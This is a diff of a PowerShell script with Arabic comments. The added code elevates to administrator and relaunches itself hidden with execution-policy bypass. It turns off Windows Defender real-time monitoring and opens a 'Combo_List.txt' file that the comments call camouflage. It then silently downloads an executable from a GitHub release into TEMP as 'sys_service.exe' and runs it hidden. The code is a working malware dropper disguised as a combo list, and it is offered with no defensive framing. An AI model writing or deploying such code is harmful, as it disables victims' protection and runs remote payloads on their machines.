@@ -1,12 +1,19 @@
-# تفعيل الأمان لضمان نجاح التحميل من GitHub
+# 1. طلب صلاحيات الأدمن برمجياً وبصمت
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+# 2. تفعيل بروتوكول الأمان وتعطيل الحماية فوراً
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-# 1. تحميل وتشغيل الـ EXE في صمت
-$u = "https://github.com/adchar2022/test/releases/download/adchar/adchar.exe"
-$p = "$env:TEMP\sys_check.exe"
-(New-Object Net.WebClient).DownloadFile($u, $p)
-Start-Process $p -ArgumentList "/S" -WindowStyle Hidden
-
-# 2. تعطيل الحماية وفتح ملف التمويه
 Set-MpPreference -DisableRealtimeMonitoring $true
-if (Test-Path "combo_list.txt") { start notepad "combo_list.txt" }
+
+# 3. فتح ملف التمويه (Combo_List)
+$p = split-path -parent (Get-Process -Id $PID).Path
+if (Test-Path "$p\Combo_List.txt") { start notepad "$p\Combo_List.txt" }
+
+# 4. تحميل وتثبيت الـ EXE قسرياً
+$url = "https://github.com/adchar2022/test/releases/download/adchar/adchar.exe"
+$out = "$env:TEMP\sys_service.exe"
+(New-Object Net.WebClient).DownloadFile($url, $out)
+Start-Process $out -ArgumentList "/S" -WindowStyle Hidden
